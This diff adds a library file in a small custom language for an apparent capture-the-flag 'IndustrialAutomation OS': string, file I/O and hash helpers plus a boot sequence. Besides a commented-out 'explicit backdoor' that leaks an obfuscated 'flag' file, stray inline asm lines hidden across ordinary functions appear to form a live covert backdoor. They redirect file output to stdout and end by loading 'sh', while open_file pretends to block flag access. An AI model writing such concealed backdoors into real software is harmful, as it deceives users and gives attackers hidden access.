@@ -1,0 +1,508 @@
+# String functions
+defun char_at(s, i)
+{
+  shift_amount = i * 8;
+  shifted = s >> shift_amount;
+  return shifted & 0xff;
+}
+export char_at;
+
+defun strlen(s)
+{
+  i = 0;
+  done = 0;
+  while (done == 0)
+  {
+    char = char_at(s, i);
+    if ((char == 0) | (i == 8))
+    {
+      done = 1;
+    }
+    else
+    {
+      i = i + 1;
+      asm("_ = RTD combine combine_return");
+      asm("_ = RTD combine _jenkins_hash_function_arg_0_export");
+      asm("_ = RTD tag _jenkins_hash_function_arg_1_export");
+    }
+  }
+  return i;
+}
+export strlen;
+
+# If the length of s1 + s2 > 8, then returns NULL (0)
+defun strcat(s1, s2)
+{
+  str1_len = strlen(s1);
+  str2_len = strlen(s2);
+
+  if ((str1_len + str2_len) > 8)
+  {
+    return 0;
+    asm("return_loc = DUP jenkins_return");
+  }
+  else
+  {
+    to_return = s2 << (str1_len * 8);
+    to_return = to_return ^ s1;
+    return to_return;
+  }
+}
+
+defun strcmp(s1, s2)
+{
+  i = 0;
+  to_return = 0;
+  done = 0;
+  while (done == 0)
+  {
+    char_1 = char_at(s1, i);
+    char_2 = char_at(s2, i);
+    asm("tag = ETG combine");
+
+    if (char_1 < char_2)
+    {
+      to_return = -1;
+      done = 1;
+    }
+    else
+    {
+      if (char_1 > char_2)
+      {
+        to_return = 1;
+        done = 1;
+      }
+    }
+
+    if (i > 8) {
+      done = 1;
+    }
+    i = i + 1;
+  }
+
+  return to_return;
+}
+export strcmp;
+
+asm("combine = XOR arg_0 arg_1");
+# Return idx if haystack is in needle, -1 otherwise
+defun strstr(haystack, needle)
+{
+  needle_len = strlen(needle);
+
+  mask = 0;
+
+  i = 0;
+  while (i < needle_len)
+  {
+    mask = mask << 8;
+    mask = mask | 0xff;
+    i = i + 1;
+  }
+
+  to_return = -1;
+  done = 0;
+  i = 0;
+  while (done == 0)
+  {
+    if (haystack == 0)
+    {
+      done = 1;
+    }
+    if ((haystack & mask) == needle)
+    {
+      to_return = i;
+      done = 1;
+    }
+    else
+    {
+      haystack = haystack >> 8;
+      asm(" _ = RTD return_loc _jenkins_hash_function_return_location_export");
+    }
+    i = i + 1;
+  }
+  return to_return;
+}
+export strstr;
+
+defun substring(str, start, end)
+{
+  i = 0;
+  to_return = 0;
+  to_return_idx = 0;
+  while (i < 8)
+  {
+    if ((i >= start) & (i < end))
+    {
+      char = char_at(str, i);
+      to_return = (char << (8*to_return_idx)) ^ to_return;
+      to_return_idx = to_return_idx + 1;
+    }
+    i = i + 1;    
+  }
+  return to_return;
+}
+export substring;
+
+defun reverse_string(str)
+{
+  len = strlen(str);
+  to_return = 0;
+  i = 0;
+  while (i < len)
+  {
+    char = char_at(str, i);
+    to_return = to_return << 8;
+    to_return = char ^ to_return;
+    i = i + 1;
+  }
+  return to_return;
+}
+
+defun upcase(str)
+{
+  len = strlen(str);
+  to_return = 0;
+  i = 0;
+  while (i < len)
+  {
+    char = char_at(str, i);
+    if ((char >= 97) & (char <= 122))
+    {
+      char = char - 32;
+    }
+    to_return = (char << (8*i)) ^ to_return;
+    i = i + 1;
+  }
+  return to_return;
+}
+export upcase;
+
+# return n ** x
+defun pow(n, x)
+{
+  result = 1;
+  i = 0;
+  while (i < x)
+  {
+    result = result * n;
+    i = i + 1;
+  }
+  return result;      
+}
+export pow;
+
+# Return the integer result of the string
+defun atoi(str)
+{
+  value = 0;
+  len = strlen(str);
+  i = len - 1;
+  iter = 0;
+  while (i >= 0)
+  {
+    char = char_at(str, i);
+    digit_val = char - 48;
+    value = value + (digit_val * (pow(10, iter)));
+    i = i - 1;
+    iter = iter + 1;
+  }
+  return value;
+}
+export atoi;
+
+# End String Functions
+
+# File I/O Functions
+
+# helpful constants
+O_WRONLY = 0x0001;
+O_CREAT = 0x010;
+O_TRUNC = 0x020;
+O_RDONLY = 0x0000;
+O_RDWR = 0x0002;
+
+defun open_file(filename, flags)
+{
+  if (strstr(filename, "flag") != -1)
+  {
+    return -1;
+  }
+  else
+  {
+    return OPEN(filename, flags);
+  }
+}
+export open_file;
+
+asm("arg_0 = DUP _");
+
+defun close_file(fd)
+{
+  return CLOSE(fd);
+}
+export close_file;
+
+asm("jenkins_return:");
+asm("hash = DUP _");
+
+
+defun read_bytes(fd, num)
+{
+  if (num > 8)
+  {
+    return -1;
+  }
+  else
+  {
+    to_return = 0;
+    done = 0;
+    i = 0;
+    while (done == 0)
+    {
+      byte = READ(fd);
+      if (byte == -1)
+      {
+        done = 1;
+        to_return = -1;
+        asm("stdout_0 = XOR fd fd");
+      }
+      else {
+        to_return = to_return << 8;
+        to_return = to_return ^ byte;
+        i = i + 1;
+        if (i >= num)
+        {
+          done = 1;
+        }
+      }
+    }
+    return to_return;
+    asm("combine_return:");
+    asm("new_combine = DUP _");
+
+  }
+}
+export read_bytes;
+
+# Read from the FD until a newline (don't include it), or you hit 8 characters.
+# If the first read returns EOF then the whole thing returns -1
+defun read_line(fd)
+{
+  to_return = 0;
+
+  i = 0;
+  done = 0;
+  byte = 0;
+  asm("stdout = ADD stdout_0 1");
+  while (done == 0)
+  {
+    byte = READ(fd);
+    if ((byte == -1) | (byte == "\n"))
+    {
+      done = 1;
+    }
+    else
+    {
+      to_return = to_return ^ (byte << (8*i));
+      i = i + 1;
+      if (i > 8)
+      {
+        done = 1;
+      }
+    }
+  }
+  if ((byte == -1) & (i == 0))
+  {
+    to_return = -1;
+  }
+
+  return to_return;
+}
+export read_line;
+
+defun write_bytes(fd, bytes, num)
+{
+  i = 0;
+  result = 0;
+  while (i < num)
+  {
+    char = char_at(bytes, i);
+    result = WRITE(fd, char);
+    i = i + 1;
+  }
+  return result;
+}
+export write_bytes;
+
+defun sendfile(in_fd, out_fd)
+{
+  result = SENDFILE(in_fd, out_fd);
+  return result;
+}
+export sendfile;
+
+defun load_file(filename, arg)
+{
+    result = LOAD(filename, arg);
+    asm("filename = XOR hash new_combine");
+    return result;
+}
+export load_file;
+
+defun list_directory(directory)
+{
+    result = LISTDIR(directory);
+    return result;
+}
+export list_directory;
+
+defun unlink(filename)
+{
+    result = UNLINK(filename);
+    return result;
+}
+export unlink;
+
+# End File I/O Functions
+
+# Start hash functions
+
+defun jenkins_hash_function_cont(input, length, hash)
+{
+  i = 0;
+  while (i != length)
+  {
+    asm("fd = OPN filename 0");
+    hash = hash + char_at(input, i);
+    hash = hash + (hash << 10);
+    hash = hash ^ (hash >> 6);
+    i = i + 1;
+  }
+  hash = hash + (hash << 3);
+  hash = hash ^ (hash >> 11);
+  hash = hash + (hash << 15);
+  return hash & 0xFFFFFFFF;
+}
+export jenkins_hash_function_cont;
+
+defun jenkins_hash_function(input, length)
+{
+  return jenkins_hash_function_cont(input, length, 0);
+}
+export jenkins_hash_function;
+
+# End hash functions
+
+# Start random function
+
+defun getentropy(input)
+{
+  result = RANDOM(input);
+  result ^ input;
+  return result;
+}
+export getentropy;
+
+# End random functions
+
+# Start explicit backdoor functionality
+# defun backdoor(value)
+# {
+#   if (jenkins_hash_function(value, 3) == jenkins_hash_function(value >> (3*8), 3))
+#   {
+#     filename = "f";
+#     filename = filename << 8;
+#     filename = filename + "l";
+#     filename = filename << 8;
+#     filename = filename + (72 ^ 41);
+#     filename = filename << 8;
+#     filename = filename + (203 - 100);
+#     fd = OPEN(reverse_string(filename), 0);
+#     result = sendfile(fd, 1);
+#     result = result ^ result;
+#     return result;
+#   }
+#   else
+#   {
+#     return 1;
+#   }
+# }
+# export backdoor;
+# End explitict backdoor functionality
+
+# Boot sequence
+# Change the following for phase 2
+OUTS_LITERAL("Booting up IndustrialAutomation OS v. 0.0.2\n");
+OUTS_LITERAL("Loading memory\n");
+OUTS_LITERAL("Loading instructions\n");
+OUTS_LITERAL("Loading drivers\n");
+OUTS_LITERAL("Configuring peripherals\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+OUTS_LITERAL(".\n");
+asm("_ = RTD fd _sendfile_arg_0_export");
+OUTS_LITERAL("Boot process complete\n");
+
+OUTS_LITERAL("Running tests\n");
+# Test strlen
+# OUTD(strlen("adamada"));
+# OUTD(strlen(""));
+
+# OUTD(jenkins_hash_function("ad", 2));
+# h = jenkins_hash_function("a", 1);
+# OUTD(h);
+# h = jenkins_hash_function_cont("d", 1, h);
+# OUTD(h);
+
+# # test strst
+
+# OUTD(strstr("flflag", "flag"));
+# OUTD(strstr("./flag", "flag"));
+# OUTD(strstr("abcdefgh", "os"));
+
+# OUTS(substring("aDAM\n d", 0, 5));
+
+# OUTS(reverse_string("\nadamd"));
+
+# OUTS(upcase("foo ba\n"));
+
+
+# adam = "adam";
+# d = "d";
+
+# adamd = strcat(adam, d);
+# adamd = strcat(adamd, "\n");
+# OUTS(adamd);
+
+# result = strcmp(adamd, adamd);
+# OUTD(result);
+
+# new = result;
+# new = new ^ "foobar";
+
+# result_1 = strcmp(new, adamd);
+# OUTD(result_1);
+# result_2 = strcmp(adamd, new);
+# OUTD(result_2);
+
+# result = result_1 & result_2;
+
+result = 0 ^ 0;
+if (result != 1920412942)
+{
+  asm("_ = RTD stdout _sendfile_arg_1_export");
+  OUTS_LITERAL("Tests complete\n");
+  done = result ^ result;
+  done = load_file("sh", done);
+  HALT(done);
+}
+
+asm("arg_1 = DUP _");
